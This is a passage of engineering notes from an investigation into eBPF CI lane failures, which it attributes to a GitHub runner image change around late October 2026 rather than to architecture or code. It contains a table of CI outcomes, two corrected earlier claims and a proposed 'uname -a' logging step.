Fixed by capturing the output and testing *it* for emptiness. The general
shape is worth keeping: **a fallback keyed on exit status can contradict
the data beside it; one keyed on empty output cannot.** This is the same
family as the `pre_exec_ran` marker removed earlier — a diagnostic whose
answer came from somewhere other than the thing it claimed to describe —
and it is the third defect this instrument has had found by running it
rather than by reading it.

## Run 16 — the eBPF lane has had THREE failure regimes, and the boundary is a runner image

Prompted by "still seeing failures on the eBPF side", which is true and
which the rate explains — but checking it against `main`'s own history
contradicted the framing this whole investigation has carried.

The eBPF lane's outcome on the last 25 CI runs on `main`, with the
GitHub runner image each ran on:

| date | outcome | runner image |
|---|---|---|
| 10-25 → 10-27 | **success ×9** | `20261012.334.1` |
| 10-28 | success ×1, **failure ×5** | `20261025.353.1` (the 10-28 success too) |
| 10-28 (one earlier run) | success | `20261021.278.1` |
| 10-29 → 11-01 | **failure ×10** | `20261025.353.1` |

Ten of ten green on the old images. One of eleven green on the new one.

### Why this is not one regression but three regimes

The obvious reading — the image rollover broke the handshake — is wrong
about the dates, and the check that catches it is cheap: **the #1185
control probe, the scope probe and `wait_for_traced_root` all landed
together in `9880eb77` (#1313) on 2026-10-30.** The lane began failing on
**10-28**, two days before any of them existed. So the early failures
cannot be handshake failures.

Reading one: `07982870`, 10-29:

```
WARN could not attach do_filp_open kprobe: `perf_event_open` failed
     m213 SC-001: rustc invocations captured via compiler_pipeline = 7
```

That is **#1252**, not #1185 — the kprobe attach failure, with the m210
trace still running and still capturing. So:

1. **≤ 10-27** — green, on runner images `20261012.334.1` and
   `20261021.278.1`.
2. **10-28 → 10-29** — red from #1252's `do_filp_open` kprobe, on image
   `20261025.353.1`.
3. **10-30 onward** — red from the #1185 handshake, because #1313's
   fail-closed guard aborts the harness *before* the m210 trace is
   reached. The kprobe problem is presumably still present and no longer
   the thing that reports.

The common factor across regimes 2 and 3 is the image, not the code.

### Two claims this corrects

**"x86_64 cannot establish its traced root" is the wrong statement.** The
architecture did not change on 2026-10-28; the runner image did. The
honest form is: *the runner image that arrived around 10-28 establishes
the traced root about a third of the time, where its predecessors did so
reliably enough for ten consecutive green runs.* Every encoding
hypothesis this branch chased — the NULL filename, `dfd` validation
order, the 7.0 `__filename_val` field — was a search for an architecture
difference when the variable was an image change. Run 13 had already
shown encoding was not the mechanism; this says why the search was aimed
there.

**The #1252 onset date in this repository's notes is a week early.** They
record it failing "on every main run since 2026-10-21". The lane was
green on 10-25, 10-26 and 10-27. The onset is 10-28, and it coincides
with the image rollover rather than with any commit. #1252's own
description is recorded as having got its onset date wrong once already,
"because the evidence had scrolled away" — this is the same error
repeated, and the fix is the table above, built from the API rather than
from recollection.

### The gap that made this hard, and the one-line fix

**The eBPF CI lane never prints its kernel.** Image version is
recoverable from the Actions log, but the kernel — the thing that
actually changed under the probes — is not, for any historical run. So
the old image's kernel is **unmeasured and now unmeasurable**: there is
no log that recorded it. The failing runs report `7.0.0-1017-azure`,
from the handshake-rate workflow, which records kernel identity as its
first step precisely because the kernel is the independent variable.

A `uname -a` step in the lane closes this for the next rollover, which is
the one durable thing to take from this run.

### What it does to the next measurement

The live-window hypothesis from runs 14 and 15 stands — `openat_entered`
spanning 0..378 and 0..218 is unaffected by any of this. But it acquires
a sharper form: whatever the new image changed, it changed *when the
entry program becomes live relative to a freshly forked child*, and a
kernel bump is a plausible source for exactly that. Timestamping the
program's own clock remains the next instrument; this run says to
timestamp the attach too, and to compare against an older image if one
can still be requested.
